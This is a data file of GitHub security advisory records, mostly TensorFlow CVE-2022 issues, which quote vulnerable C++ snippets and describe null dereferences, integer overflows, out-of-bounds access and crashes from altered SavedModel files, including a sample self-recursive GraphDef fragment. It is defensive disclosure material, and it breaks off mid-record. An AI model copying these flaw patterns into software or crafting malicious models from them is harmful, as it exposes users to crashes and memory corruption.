2220,17961,mout,GHSA-pc58-wgmc-hfjr,CVE-2020-7792,https://github.com/advisories/GHSA-pc58-wgmc-hfjr,high,2022-02-09 22:49:10 UTC,Prototype Pollution in mout,"This affects all versions of package mout. The deepFillIn function can be used to 'fill missing properties recursively', while the deepMixIn 'mixes objects into the target object, recursively mixing existing child objects as well'. In both cases, the key used to access the target object recursively is not checked, leading to a Prototype Pollution.",npm
2221,18778,jsrsasign,GHSA-h87q-g2wp-47pj,,https://github.com/advisories/GHSA-h87q-g2wp-47pj,moderate,2022-02-09 22:41:19 UTC,Signatures are mistakenly recognized to be valid in jsrsasign,"In the jsrsasign package through 10.1.13 for Node.js, some invalid RSA PKCS#1 v1.5 signatures are mistakenly recognized to be valid. NOTE: there is no known practical attack.",npm
2222,15827,node-sass,GHSA-r8f7-9pfq-mjmv,CVE-2020-24025,https://github.com/advisories/GHSA-r8f7-9pfq-mjmv,moderate,2022-02-09 22:22:24 UTC,Improper Certificate Validation in node-sass,Certificate validation in node-sass 2.0.0 to 6.0.1 is disabled when requesting binaries even if the user is not specifying an alternative download path.,npm
2223,20741,tensorflow,GHSA-8cxv-76p7-jxwr,CVE-2022-23577,https://github.com/advisories/GHSA-8cxv-76p7-jxwr,moderate,2022-02-10 00:32:29 UTC,Null-dereference in Tensorflow,"### Impact
The [implementation of `GetInitOp`](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/cc/saved_model/loader_util.cc#L31-L61) is vulnerable to a crash caused by dereferencing a null pointer:

```cc
const auto& init_op_sig_it =
    meta_graph_def.signature_def().find(kSavedModelInitOpSignatureKey);
if (init_op_sig_it != sig_def_map.end()) {
  *init_op_name = init_op_sig_it->second.outputs()
                      .find(kSavedModelInitOpSignatureKey)
                      ->second.name();
  return Status::OK();
}
```

Here, we have a nested map and we assume that if the first `.find` succeeds then so would be the search in the internal map. However, the maps are built based on the `SavedModel` protobuf format and a malicious user can alter that on disk before loading to cause the second `.find` to return `nullptr`.
### Patches
We have patched the issue in GitHub commit [4f38b1ac8e42727e18a2f0bde06d3bee8e77b250](https://github.com/tensorflow/tensorflow/commit/4f38b1ac8e42727e18a2f0bde06d3bee8e77b250).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",pip
2224,20741,tensorflow,GHSA-wm93-f238-7v37,CVE-2022-23576,https://github.com/advisories/GHSA-wm93-f238-7v37,moderate,2022-02-10 00:32:44 UTC,Integer overflow in Tensorflow,"### Impact
The [implementation of `OpLevelCostEstimator::CalculateOutputSize`](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/grappler/costs/op_level_cost_estimator.cc#L1598-L1617) is vulnerable to an integer overflow if an attacker can create an operation which would involve tensors with large enough number of elements:
```cc
for (const auto& dim : output_shape.dim()) {
  output_size *= dim.size();
} 
```
  
Here, we can have a large enough number of dimensions in `output_shape.dim()` or just a small number of dimensions being large enough to cause an overflow in the multiplication.

### Patches
We have patched the issue in GitHub commit [b9bd6cfd1c50e6807846af9a86f9b83cafc9c8ae](https://github.com/tensorflow/tensorflow/commit/b9bd6cfd1c50e6807846af9a86f9b83cafc9c8ae).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information 
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.
",pip
2225,20741,tensorflow,GHSA-c94w-c95p-phf8,CVE-2022-23575,https://github.com/advisories/GHSA-c94w-c95p-phf8,moderate,2022-02-10 00:32:59 UTC,Integer overflow in Tensorflow,"### Impact
The [implementation of `OpLevelCostEstimator::CalculateTensorSize`](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/grappler/costs/op_level_cost_estimator.cc#L1552-L1558) is vulnerable to an integer overflow if an attacker can create an operation which would involve a tensor with large enough number of elements:
```cc
int64_t OpLevelCostEstimator::CalculateTensorSize(
    const OpInfo::TensorProperties& tensor, bool* found_unknown_shapes) {
  int64_t count = CalculateTensorElementCount(tensor, found_unknown_shapes);
  int size = DataTypeSize(BaseType(tensor.dtype()));
  VLOG(2) << ""Count: "" << count << "" DataTypeSize: "" << size;
  return count * size;
}
```
Here, `count` and `size` can be large enough to cause `count * size` to overflow.

### Patches
We have patched the issue in GitHub commit [fcd18ce3101f245b083b30655c27b239dc72221e](https://github.com/tensorflow/tensorflow/commit/fcd18ce3101f245b083b30655c27b239dc72221e).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",pip
2226,20741,tensorflow,GHSA-8r7c-3cm2-3h8f,CVE-2022-23578,https://github.com/advisories/GHSA-8r7c-3cm2-3h8f,moderate,2022-02-10 00:33:13 UTC,Memory leak in Tensorflow,"### Impact
If a graph node is invalid, TensorFlow can leak memory in the [implementation of `ImmutableExecutorState::Initialize`](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/common_runtime/immutable_executor_state.cc#L84-L262):

```cc
Status s = params_.create_kernel(n->properties(), &item->kernel);
if (!s.ok()) {
  item->kernel = nullptr;
  s = AttachDef(s, *n);
  return s;           
}                     
```

Here, we set `item->kernel` to `nullptr` but it is a simple `OpKernel*` pointer so the memory that was previously allocated to it would leak.

### Patches
We have patched the issue in GitHub commit [c79ccba517dbb1a0ccb9b01ee3bd2a63748b60dd](https://github.com/tensorflow/tensorflow/commit/c79ccba517dbb1a0ccb9b01ee3bd2a63748b60dd).
The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information 
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",pip
2227,20741,tensorflow,GHSA-5f2r-qp73-37mr,CVE-2022-23579,https://github.com/advisories/GHSA-5f2r-qp73-37mr,moderate,2022-02-10 00:33:29 UTC,`CHECK`-failures during Grappler's `SafeToRemoveIdentity` in Tensorflow,"### Impact
The Grappler optimizer in TensorFlow can be used to cause a denial of service by altering a `SavedModel` such that [`SafeToRemoveIdentity`](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/grappler/optimizers/dependency_optimizer.cc#L59-L98) would trigger `CHECK` failures.

### Patches
We have patched the issue in GitHub commit [92dba16749fae36c246bec3f9ba474d9ddeb7662](https://github.com/tensorflow/tensorflow/commit/92dba16749fae36c246bec3f9ba474d9ddeb7662).
The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.
### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",pip
2228,20741,tensorflow,GHSA-4j82-5ccr-4r8v,CVE-2022-23582,https://github.com/advisories/GHSA-4j82-5ccr-4r8v,moderate,2022-02-10 00:34:01 UTC,`CHECK`-failures in `TensorByteSize` in Tensorflow,"### Impact
A malicious user can cause a denial of service by altering a `SavedModel` such that [`TensorByteSize`](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/framework/attr_value_util.cc#L46-L50) would trigger `CHECK` failures.

```cc
int64_t TensorByteSize(const TensorProto& t) {
  // num_elements returns -1 if shape is not fully defined.
  int64_t num_elems = TensorShape(t.tensor_shape()).num_elements();
  return num_elems < 0 ? -1 : num_elems * DataTypeSize(t.dtype());
}
```
`TensorShape` constructor throws a `CHECK`-fail if shape is partial or has a number of elements that would overflow the size of an `int`. The `PartialTensorShape` constructor instead does not cause a `CHECK`-abort if the shape is partial, which is exactly what this function needs to be able to return `-1`.

### Patches
We have patched the issue in GitHub commit [c2426bba00a01de6913738df8fa78e0215fcce02](https://github.com/tensorflow/tensorflow/commit/c2426bba00a01de6913738df8fa78e0215fcce02).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",pip
2229,20741,tensorflow,GHSA-gjqc-q9g6-q2j3,CVE-2022-23583,https://github.com/advisories/GHSA-gjqc-q9g6-q2j3,moderate,2022-02-10 00:34:13 UTC,`CHECK`-failures in binary ops in Tensorflow,"### Impact
A malicious user can cause a denial of service by altering a `SavedModel` such that [any binary op](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/kernels/cwise_ops_common.h#L88-L137) would trigger `CHECK` failures. This occurs when the protobuf part corresponding to the tensor arguments is modified such that the `dtype` no longer matches the `dtype` expected by the op. In that case, calling the templated binary operator for the binary op would receive corrupted data, due to the type confusion involved:

```cc
functor::BinaryFunctor<Device, Functor, 1>()(
    eigen_device, out->template flat<Tout>(),
    input_0.template flat<Tin>(), input_1.template flat<Tin>(),
    error_ptr);
```
If `Tin` and `Tout` don't match the type of data in `out` and `input_*` tensors then `flat<*>` would interpret it wrongly. In most cases, this would be a silent failure, but we have noticed scenarios where this results in a `CHECK` crash, hence a denial of service.

### Patches
We have patched the issue in GitHub commit [a7c02f1a9bbc35473969618a09ee5f9f5d3e52d9](https://github.com/tensorflow/tensorflow/commit/a7c02f1a9bbc35473969618a09ee5f9f5d3e52d9).
The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",pip
2230,20741,tensorflow,GHSA-24x4-6qmh-88qg,CVE-2022-23584,https://github.com/advisories/GHSA-24x4-6qmh-88qg,high,2022-02-09 23:57:42 UTC,Use after free in `DecodePng` kernel,"### Impact
A malicious user can cause a use after free behavior when [decoding PNG images](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/kernels/image/decode_image_op.cc#L339-L346):
```cc
if (/* ... error conditions ... */) {
  png::CommonFreeDecode(&decode);
  OP_REQUIRES(context, false,
              errors::InvalidArgument(""PNG size too large for int: "",
                                      decode.width, "" by "", decode.height));
}   
```
After `png::CommonFreeDecode(&decode)` gets called, the values of `decode.width` and `decode.height` are in an unspecified state.

### Patches
We have patched the issue in GitHub commit [e746adbfcfee15e9cfdb391ff746c765b99bdf9b](https://github.com/tensorflow/tensorflow/commit/e746adbfcfee15e9cfdb391ff746c765b99bdf9b).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",pip
2231,20741,tensorflow,GHSA-77gp-3h4r-6428,CVE-2022-23574,https://github.com/advisories/GHSA-77gp-3h4r-6428,high,2022-02-09 23:25:40 UTC,Out of bounds read and write in Tensorflow,"### Impact
There is a typo in TensorFlow's [`SpecializeType`](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/framework/full_type_util.cc#L81-L102) which results in heap OOB read/write:

```cc
for (int i = 0; i < op_def.output_arg_size(); i++) {
  // ...
  for (int j = 0; j < t->args_size(); j++) {
    auto* arg = t->mutable_args(i);
    // ...
  }
} 
```

Due to a typo, `arg` is initialized to the `i`th mutable argument in a loop where the loop index is `j`. Hence it is possible to assign to `arg` from outside the vector of arguments. Since this is a mutable proto value, it allows both read and write to outside of bounds data.

### Patches
We have patched the issue in GitHub commit [0657c83d08845cc434175934c642299de2c0f042](https://github.com/tensorflow/tensorflow/commit/0657c83d08845cc434175934c642299de2c0f042).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, and TensorFlow 2.6.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",pip
2232,20741,tensorflow,GHSA-fq6p-6334-8gr4,CVE-2022-23585,https://github.com/advisories/GHSA-fq6p-6334-8gr4,moderate,2022-02-09 23:26:08 UTC,Memory leak in decoding PNG images,"### Impact
When [decoding PNG images](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/kernels/image/decode_image_op.cc#L322-L416) TensorFlow can produce a memory leak if the image is invalid.
After calling `png::CommonInitDecode(..., &decode)`, the `decode` value contains allocated buffers which can only be freed by calling `png::CommonFreeDecode(&decode)`. However, several error case in the function implementation invoke the `OP_REQUIRES` macro which immediately terminates the execution of the function, without allowing for the memory free to occur.
  
### Patches   
We have patched the issue in GitHub commit [ab51e5b813573dc9f51efa335aebcf2994125ee9](https://github.com/tensorflow/tensorflow/commit/ab51e5b813573dc9f51efa335aebcf2994125ee9).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",pip
2233,20741,tensorflow,GHSA-q85f-69q7-55h2,CVE-2022-23573,https://github.com/advisories/GHSA-q85f-69q7-55h2,high,2022-02-09 23:26:50 UTC,Uninitialized variable access in Tensorflow,"### Impact
The [implementation of `AssignOp`](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/kernels/assign_op.h#L30-L143) can result in copying unitialized data to a new tensor. This later results in undefined behavior.

The implementation has a check that the left hand side of the assignment is initialized (to minimize number of allocations), but does not check that the right hand side is also initialized.
  
### Patches
We have patched the issue in GitHub commit [ef1d027be116f25e25bb94a60da491c2cf55bd0b](https://github.com/tensorflow/tensorflow/commit/ef1d027be116f25e25bb94a60da491c2cf55bd0b).
    
The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.
",pip
2234,20741,tensorflow,GHSA-43jf-985q-588j,CVE-2022-23586,https://github.com/advisories/GHSA-43jf-985q-588j,moderate,2022-02-09 23:27:08 UTC,Multiple `CHECK`-fails in `function.cc` in TensowFlow,"### Impact
A malicious user can cause a denial of service by altering a `SavedModel` such that [assertions in `function.cc`](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/framework/function.cc) would be falsified and crash the Python interpreter.
### Patches
We have patched the issue in GitHub commits [dcc21c7bc972b10b6fb95c2fb0f4ab5a59680ec2](https://github.com/tensorflow/tensorflow/commit/dcc21c7bc972b10b6fb95c2fb0f4ab5a59680ec2) and [3d89911481ba6ebe8c88c1c0b595412121e6c645](https://github.com/tensorflow/tensorflow/commit/3d89911481ba6ebe8c88c1c0b595412121e6c645).
  
The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information 
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",pip
2235,20741,tensorflow,GHSA-8jj7-5vxc-pg2q,CVE-2022-23587,https://github.com/advisories/GHSA-8jj7-5vxc-pg2q,high,2022-02-09 23:27:49 UTC,Integer overflow in TensorFlow,"### Impact
Under certain scenarios, Grappler component of TensorFlow is vulnerable to an integer overflow during [cost estimation for crop and resize](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/grappler/costs/op_level_cost_estimator.cc#L2621-L2689). Since the cropping parameters are user controlled, a malicious person can trigger undefined behavior.

### Patches
We have patched the issue in GitHub commit [0aaaae6eca5a7175a193696383f582f53adab23f](https://github.com/tensorflow/tensorflow/commit/0aaaae6eca5a7175a193696383f582f53adab23f).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",pip
2236,20741,tensorflow,GHSA-fx5c-h9f6-rv7c,CVE-2022-23588,https://github.com/advisories/GHSA-fx5c-h9f6-rv7c,moderate,2022-02-09 23:28:07 UTC,`CHECK`-fails due to attempting to build a reference tensor,"### Impact
A malicious user can cause a denial of service by altering a `SavedModel` such that [Grappler optimizer would attempt to build a tensor using a reference `dtype`](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/grappler/optimizers/constant_folding.cc#L1328-L1402). This would result in a crash due to a `CHECK`-fail [in the `Tensor` constructor](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/framework/tensor.cc#L733-L781) as reference types are not allowed.
### Patches
We have patched the issue in GitHub commit [6b5adc0877de832b2a7c189532dbbbc64622eeb6](https://github.com/tensorflow/tensorflow/commit/6b5adc0877de832b2a7c189532dbbbc64622eeb6).
The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",pip
2237,20741,tensorflow,GHSA-rww7-2gpw-fv6j,CVE-2022-23572,https://github.com/advisories/GHSA-rww7-2gpw-fv6j,moderate,2022-02-09 23:28:29 UTC,Crash when type cannot be specialized in Tensorflow,"### Impact
Under certain scenarios, TensorFlow can fail to specialize a type during [shape inference](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/framework/shape_inference.cc#L168-L174):

```cc
void InferenceContext::PreInputInit(
    const OpDef& op_def, const std::vector<const Tensor*>& input_tensors,
    const std::vector<ShapeHandle>& input_tensors_as_shapes) {
  const auto ret = full_type::SpecializeType(attrs_, op_def);
  DCHECK(ret.status().ok()) << ""while instantiating types: "" << ret.status();
  ret_types_ = ret.ValueOrDie();
  // ... 
}
```

However, `DCHECK` is a no-op in production builds and an assertion failure in debug builds. In the first case execution proceeds to the `ValueOrDie` line. This results in an assertion failure as `ret` contains an error `Status`, not a value. In the second case we also get a crash due to the assertion failure.
### Patches
We have patched the issue in GitHub commit [cb164786dc891ea11d3a900e90367c339305dc7b](https://github.com/tensorflow/tensorflow/commit/cb164786dc891ea11d3a900e90367c339305dc7b).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, and TensorFlow 2.6.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",pip
2238,20741,tensorflow,GHSA-j3mj-fhpq-qqjj,CVE-2022-23571,https://github.com/advisories/GHSA-j3mj-fhpq-qqjj,moderate,2022-02-09 23:28:57 UTC,Reachable Assertion in Tensorflow,"### Impact
When decoding a tensor from protobuf, a TensorFlow process can encounter cases where a `CHECK` assertion is invalidated based on user controlled arguments, if the tensors have an invalid `dtype` and 0 elements or an invalid shape. This allows attackers to cause denial of services in TensorFlow processes.

### Patches
We have patched the issue in GitHub commit [5b491cd5e41ad63735161cec9c2a568172c8b6a3](https://github.com/tensorflow/tensorflow/commit/5b491cd5e41ad63735161cec9c2a568172c8b6a3).
  
The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range. 
  
### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",pip
2239,20741,tensorflow,GHSA-9px9-73fg-3fqp,CVE-2022-23589,https://github.com/advisories/GHSA-9px9-73fg-3fqp,moderate,2022-02-09 23:29:14 UTC,Null pointer dereference in Grappler's `IsConstant`,"### Impact
Under certain scenarios, Grappler component of TensorFlow can trigger a null pointer dereference. There are 2 places where this can occur, for the same malicious alteration of a `SavedModel` file (fixing the first one would trigger the same dereference in the second place):

First, during [constant folding](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/grappler/optimizers/constant_folding.cc#L3466-L3497), the `GraphDef` might not have the required nodes for the binary operation:

```cc
  NodeDef* mul_left_child = node_map_->GetNode(node->input(0));
  NodeDef* mul_right_child = node_map_->GetNode(node->input(1));
  // One child must be constant, and the second must be Conv op.
  const bool left_child_is_constant = IsReallyConstant(*mul_left_child);
  const bool right_child_is_constant = IsReallyConstant(*mul_right_child);
```

If a node is missing, the correposning `mul_*child` would be null, and the dereference in the subsequent line would be incorrect.

We have a similar issue during [`IsIdentityConsumingSwitch`](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/grappler/mutable_graph_view.cc#L59-L74):

```cc
  NodeDef* input_node = graph.GetNode(tensor_id.node());
  return IsSwitch(*input_node);
```

### Patches
We have patched the issue in GitHub commits [0a365c029e437be0349c31f8d4c9926b69fa3fa1](https://github.com/tensorflow/tensorflow/commit/0a365c029e437be0349c31f8d4c9926b69fa3fa1) and [045deec1cbdebb27d817008ad5df94d96a08b1bf](https://github.com/tensorflow/tensorflow/commit/045deec1cbdebb27d817008ad5df94d96a08b1bf).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",pip
2240,20741,tensorflow,GHSA-pqrv-8r2f-7278,CVE-2022-23590,https://github.com/advisories/GHSA-pqrv-8r2f-7278,moderate,2022-02-09 23:29:38 UTC,Crash due to erroneous `StatusOr` in TensorFlow,"### Impact
A `GraphDef` from a TensorFlow `SavedModel` can be maliciously altered to cause a TensorFlow process to crash due to encountering [a `StatusOr` value that is an error and forcibly extracting the value from it](https://github.com/tensorflow/tensorflow/blob/274df9b02330b790aa8de1cee164b70f72b9b244/tensorflow/core/graph/graph.cc#L560-L567):

```cc
  if (op_reg_data->type_ctor != nullptr) {
    VLOG(3) << ""AddNode: found type constructor for "" << node_def.name();
    const auto ctor_type =
        full_type::SpecializeType(AttrSlice(node_def), op_reg_data->op_def);
    const FullTypeDef ctor_typedef = ctor_type.ValueOrDie();
    if (ctor_typedef.type_id() != TFT_UNSET) {
      *(node_def.mutable_experimental_type()) = ctor_typedef;
    }
  }
```   
      
If `ctor_type` is an error status, `ValueOrDie` results in a crash.
        
### Patches
We have patched the issue in GitHub commit [955059813cc325dc1db5e2daa6221271406d4439](https://github.com/tensorflow/tensorflow/commit/955059813cc325dc1db5e2daa6221271406d4439).
  
We have patched the issue in multiple GitHub commits and these will be included in TensorFlow 2.8.0 and TensorFlow 2.7.1, as both are affected.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",pip
2241,20741,tensorflow,GHSA-247x-2f9f-5wp7,CVE-2022-23591,https://github.com/advisories/GHSA-247x-2f9f-5wp7,high,2022-02-09 23:30:01 UTC,Stack overflow in TensorFlow,"### Impact
The `GraphDef` format in TensorFlow does not allow self recursive functions. The runtime assumes that this invariant is satisfied. However, a `GraphDef` containing a fragment such as the following can be consumed when loading a `SavedModel`:

```
  library {
    function {
      signature {
        name: ""SomeOp""
        description: ""Self recursive op""
      }
      node_def {
        name: ""1""
        op: ""SomeOp""
      }
      node_def {
        name: ""2""
        op: ""SomeOp""
      }
    }
  } 
```

This would result in a stack overflow during execution as resolving each `NodeDef` means resolving the function itself and its nodes.

### Patches
We have patched the issue in GitHub commit [448a16182065bd08a202d9057dd8ca541e67996c](https://github.com/tensorflow/tensorflow/commit/448a16182065bd08a202d9057dd8ca541e67996c).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",pip
2242,20741,tensorflow,GHSA-vq36-27g6-p492,CVE-2022-23592,https://github.com/advisories/GHSA-vq36-27g6-p492,high,2022-02-09 23:31:48 UTC,Out of bounds read in Tensorflow,"### Impact
TensorFlow's [type inference](https://github.com/tensorflow/tensorflow/blob/274df9b02330b790aa8de1cee164b70f72b9b244/tensorflow/core/graph/graph.cc#L223-L229) can cause a heap OOB read as the bounds checking is done in a `DCHECK` (which is a no-op during production):

```cc
if (node_t.type_id() != TFT_UNSET) {
  int ix = input_idx[i];
  DCHECK(ix < node_t.args_size())
      << ""input "" << i << "" should have an output "" << ix
      << "" but instead only has "" << node_t.args_size()
      << "" outputs: "" << node_t.DebugString();
  input_types.emplace_back(node_t.args(ix));
  // ...
}       
```   
      
An attacker can control `input_idx` such that `ix` would be larger than the number of values in `node_t.args`.
        
### Patches
We have patched the issue in GitHub commit [c99d98cd189839dcf51aee94e7437b54b31f8abd](https://github.com/tensorflow/tensorflow/commit/c99d98cd189839dcf51aee94e7437b54b31f8abd).
  
The fix will be included in TensorFlow 2.8.0. This is the only affected version.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",pip
2243,20741,tensorflow,GHSA-gwcx-jrx4-92w2,CVE-2022-23593,https://github.com/advisories/GHSA-gwcx-jrx4-92w2,moderate,2022-02-09 23:32:08 UTC,Segfault in `simplifyBroadcast` in Tensorflow,"### Impact
The [`simplifyBroadcast` function in the MLIR-TFRT infrastructure in TensorFlow](https://github.com/tensorflow/tensorflow/blob/274df9b02330b790aa8de1cee164b70f72b9b244/tensorflow/compiler/mlir/tfrt/jit/transforms/tf_cpurt_symbolic_shape_optimization.cc#L149-L205) is vulnerable to a segfault (hence, denial of service), if called with scalar shapes.

```cc 
  size_t maxRank = 0;
  for (auto shape : llvm::enumerate(shapes)) {
    auto found_shape = analysis.dimensionsForShapeTensor(shape.value());
    if (!found_shape) return {};
    shapes_found.push_back(*found_shape);
    maxRank = std::max(maxRank, found_shape->size());
  }   

  SmallVector<const ShapeComponentAnalysis::SymbolicDimension*>
      joined_dimensions(maxRank);
```

If all shapes are scalar, then `maxRank` is 0, so we build an empty `SmallVector`.

### Patches
We have patched the issue in GitHub commit [35f0fabb4c178253a964d7aabdbb15c6a398b69a](https://github.com/tensorflow/tensorflow/commit/35f0fabb4c178253a964d7aabdbb15c6a398b69a).

The fix will be included in TensorFlow 2.8.0. This is the only affected version.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",pip
2244,20741,tensorflow,GHSA-9x52-887g-fhc2,CVE-2022-23594,https://github.com/advisories/GHSA-9x52-887g-fhc2,high,2022-02-09 23:32:41 UTC,Out of bounds read in Tensorflow,"### Impact
The [TFG dialect of TensorFlow (MLIR)](https://github.com/tensorflow/tensorflow/tree/274df9b02330b790aa8de1cee164b70f72b9b244/tensorflow/core/ir/importexport) makes several assumptions about the incoming `GraphDef` before converting it to the MLIR-based dialect.

If an attacker changes the `SavedModel` format on disk to invalidate these assumptions and the `GraphDef` is then converted to MLIR-based IR then they can cause a crash in the Python interpreter. Under certain scenarios, heap OOB read/writes are possible.
    
These issues have been discovered via fuzzing and it is possible that more weaknesses exist. We will patch them as they are discovered.
        
### Patches
We have patched the issue in multiple GitHub commits and these will be included in TensorFlow 2.8.0 and TensorFlow 2.7.1, as both are affected.
      
### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",pip
2245,20741,tensorflow,GHSA-fpcp-9h7m-ffpx,CVE-2022-23595,https://github.com/advisories/GHSA-fpcp-9h7m-ffpx,moderate,2022-02-09 23:33:17 UTC,Null pointer dereference in TensorFlow,"### Impact
When [building an XLA compilation cache](https://github.com/tensorflow/tensorflow/blob/274df9b02330b790aa8de1cee164b70f72b9b244/tensorflow/compiler/jit/xla_platform_info.cc#L43-L104), if default settings are used, TensorFlow triggers a null pointer dereference:

```cc 
  string allowed_gpus =
      flr->config_proto()->gpu_options().visible_device_list();
